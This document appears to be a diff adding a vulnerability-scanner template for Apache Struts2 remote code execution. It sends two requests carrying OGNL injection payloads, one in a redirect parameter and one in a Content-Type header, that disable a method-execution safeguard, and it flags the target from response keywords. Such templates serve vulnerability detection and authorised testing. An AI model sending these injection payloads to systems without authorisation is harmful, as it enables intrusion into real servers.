@@ -1,0 +1,39 @@
+id: struts2-rce
+info:
+  name: Apache Struts2 RCE
+  severity: critical
+  description: Apache Struts2 系列远程代码执行漏洞
+  tags: struts2,rce,java,critical
+  author: poxiao
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?redirect:${%23context['xwork.MethodAccessor.denyMethodExecution']=false}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 302]
+      - type: word
+        words:
+          - "xwork"
+          - "struts"
+          - "MethodAccessor"
+        condition: or
+        part: body
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/login.action"
+    headers:
+      Content-Type: "%{(#context['xwork.MethodAccessor.denyMethodExecution']=false)}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 302]
+      - type: word
+        words:
+          - "xwork"
+          - "MethodAccessor"
+        condition: or
+        part: body
